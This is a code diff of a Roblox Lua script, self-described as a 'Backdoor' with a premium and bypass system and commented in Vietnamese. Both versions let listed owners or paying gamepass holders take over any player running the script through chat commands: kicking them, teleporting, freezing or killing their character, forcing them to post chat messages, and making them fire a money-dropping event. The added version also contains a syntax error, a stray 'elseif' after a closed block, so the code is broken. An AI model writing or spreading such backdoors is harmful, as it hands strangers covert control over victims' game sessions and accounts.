@@ -1,110 +1,149 @@
--- Backdoor + Hệ thống Premium & Bypass
 local Players = game:GetService("Players")
-local ChatService = game:GetService("TextChatService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ChatService = game:GetService("TextChatService")
+local localPlayer = Players.LocalPlayer
 
-local PREMIUM_PASS_ID = 1618296323
-local BYPASS_PASS_ID = 1618124347
+-- GAMEPASS ID
+local PREMIUM_PASS = 1618296323
+local BYPASS_PASS = 1618124347
 
-getgenv().ownerUsernames = {
-    ["anhchangm5"] = true,
-    ["Dao_Beo"] = true,
-    ["anhchangm52"] = true,
-    ["anhaycogihontoi"] = true,
-    ["anhchongyeuvo"] = true,
-    ["anhchangm53"] = true,
-}
-getgenv().premiumUsers = {
-    ["XxCookieBaconPlayzxX"] = true,
-    ["zazzvasuy"] = true,
+-- OWNER LIST
+local owners = {
+    "GameLuaNhau",
+    "quayvebenanhdi",
+    "3"
 }
 
-local function isManualPremium(plr)
-    return getgenv().premiumUsers[plr.Name] ~= nil
-end
-
--- chỉnh lại điều kiện người dùng premium
-
-getgenv().bypassUsers = {
-    ["XxCookieBaconPlayzxX"] = true,
-    ["zazzvasuy"] = true,
-}
-
-local function isOwner(plr) return getgenv().ownerUsernames[plr.Name] ~= nil end
-local function hasPremium(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, PREMIUM_PASS_ID) or isManualPremium(plr) end
-local function hasBypass(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, BYPASS_PASS_ID) or getgenv().bypassUsers[plr.Name] end
-local function canControl(target)
-    if isOwner(target) then return false end
-    if hasBypass(target) then return false end
-    return true
-end
-
-local function handleCommand(sender, text)
-    if not text:match("^:") then return end
-    local cmd, args = text:match("^:(%S+)%s*(.*)")
-    if not cmd then return end
-
-    local isSenderOwner = isOwner(sender)
-    local isSenderPremium = hasPremium(sender)
-    if not (isSenderOwner or isSenderPremium) then return end
-
-    local target = localPlayer
-    local function matches(str)
-        return str == "." or target.Name:lower():find(str:lower()) or target.DisplayName:lower():find(str:lower())
-    end
-
-    if args and args ~= "" and matches(args) then
-        if not canControl(target) then
-            -- Thông báo cho người ra lệnh biết là không thể
-            task.spawn(function()
-                wait(0.5)
-                game.StarterGui:SetCore("ChatMakeSystemMessage", {
-                    Text = "[System] Không thể dùng lệnh lên "..target.Name.." (có Bypass hoặc là Owner)",
-                    Color = Color3.fromRGB(255,100,100)
-                })
-            end)
-            return
-        end
-
-        if cmd == "bring" and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and target.Character then
-            target.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
-        elseif cmd == "fling" and target.Character then
-            target.Character.HumanoidRootPart.CFrame = CFrame.new(math.huge, math.huge, math.huge)
-        elseif cmd == "kick" then target:Kick("Bạn đã bị kick bởi "..(isSenderOwner and "Owner" or "Premium"))
-        elseif cmd == "ban" then target:Kick("PERMA-BAN bởi "..(isSenderOwner and "Owner" or "Premium"))
-        elseif cmd == "freeze" and target.Character and target.Character:FindFirstChild("LowerTorso") then
-            target.Character.LowerTorso.Anchored = true
-        elseif cmd == "unfreeze" and target.Character and target.Character:FindFirstChild("LowerTorso") then
-            target.Character.LowerTorso.Anchored = false
-        elseif cmd == "reset" and target.Character then
-            target.Character.Humanoid.Health = 0
-        elseif cmd == "dropcash" then
-            local ev = ReplicatedStorage:FindFirstChild("MainEvent")
-            if ev then ev:FireServer("DropMoney", "12000") end
-        elseif cmd == "rejoin" then
-            TeleportService:Teleport(game.PlaceId, target)
-        elseif cmd == "crash" and isSenderOwner then -- chỉ Owner mới được crash
-            while true do end
+-- CHECK OWNER
+local function isOwner(player)
+    for _, name in ipairs(owners) do
+        if player.Name == name then
+            return true
         end
     end
+    return false
+end
 
-    -- lệnh say
-    if cmd == "say" and args:find(" ") then
-        local sp = args:find(" ")
-        local who = args:sub(1, sp-1)
-        local msg = args:sub(sp+1)
-        if matches(who) and msg ~= "" and canControl(target) then
-            local chan = ChatService:FindFirstChild("TextChannels") and ChatService.TextChannels:FindFirstChild("RBXGeneral")
-            if chan then pcall(function() chan:SendAsync(msg) end) end
+-- CHECK GAMEPASS
+local function ownsPass(player, passId)
+    local success, result = pcall(function()
+        return MarketplaceService:UserOwnsGamePassAsync(player.UserId, passId)
+    end)
+    return success and result
+end
+
+-- CHECK BYPASS
+local function hasBypass(player)
+    return ownsPass(player, BYPASS_PASS)
+end
+
+-- CHECK PERMISSION (OWNER OR PREMIUM)
+local function hasPermission(player)
+    return isOwner(player) or ownsPass(player, PREMIUM_PASS)
+end
+local function forceSay(msg)
+    local chan = ChatService:FindFirstChild("TextChannels")
+        and ChatService.TextChannels:FindFirstChild("RBXGeneral")
+
+    if chan then
+        pcall(function()
+            chan:SendAsync(msg)
+        end)
+    end
+end
+-- BRING
+local function bringPlayer(owner)
+    if localPlayer.Character and owner.Character then
+        localPlayer.Character:SetPrimaryPartCFrame(
+            owner.Character.HumanoidRootPart.CFrame
+        )
+    end
+end
+
+-- FREEZE / UNFREEZE
+local function setFreeze(state)
+    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        localPlayer.Character.HumanoidRootPart.Anchored = state
+    end
+end
+
+-- RESET
+local function resetPlayer()
+    if localPlayer.Character then
+        local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.Health = 0
         end
     end
 end
 
-ChatService.MessageReceived:Connect(function(msg)
-    if msg.Text and msg.TextSource then
-        local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
-        if sender then handleCommand(sender, msg.Text) end
+-- DROP CASH
+local function dropCash()
+    local ev = ReplicatedStorage:FindFirstChild("MainEvent")
+    if ev then
+        ev:FireServer("DropMoney", "12000")
+    end
+end
+
+-- CHAT COMMAND HANDLER
+local function setupCommands(player)
+    player.Chatted:Connect(function(msg)
+        -- Bypass thì không bị ảnh hưởng
+        if hasBypass(localPlayer) then return end
+
+        -- Owner không bị ảnh hưởng bởi lệnh người khác
+        if isOwner(localPlayer) and player ~= localPlayer then return end
+
+        -- Kiểm tra quyền
+        if not hasPermission(player) then return end
+
+        if msg == "/kick ." then
+            localPlayer:Kick("Premium Has Kicked You.")
+
+        elseif msg == "/bring ." then
+            bringPlayer(player)
+
+        elseif msg == "/freeze ." then
+            setFreeze(true)
+
+        elseif msg == "/unfreeze ." then
+            setFreeze(false)
+
+        elseif msg == "/reset ." then
+            resetPlayer()
+        elseif string.sub(msg, 1, 5) == "/say " then
+            local args = string.split(msg, " ")
+        
+            -- /say <name> <message>
+            if #args >= 3 then
+                local targetName = args[2]
+        
+                -- check username hoặc display
+                if string.lower(localPlayer.Name) == string.lower(targetName)
+                or string.lower(localPlayer.DisplayName) == string.lower(targetName) then
+        
+                    -- lấy nội dung sau tên
+                    local sayMsg = table.concat(args, " ", 3)
+                    forceSay(sayMsg)
+                end
+            end
+        end
+        elseif msg == "/dropcash ." then
+            dropCash()
+        end
+    end)
+end
+
+-- SETUP CHO TẤT CẢ OWNER + PREMIUM
+for _, plr in ipairs(Players:GetPlayers()) do
+    if hasPermission(plr) then
+        setupCommands(plr)
+    end
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    if hasPermission(plr) then
+        setupCommands(plr)
     end
 end)
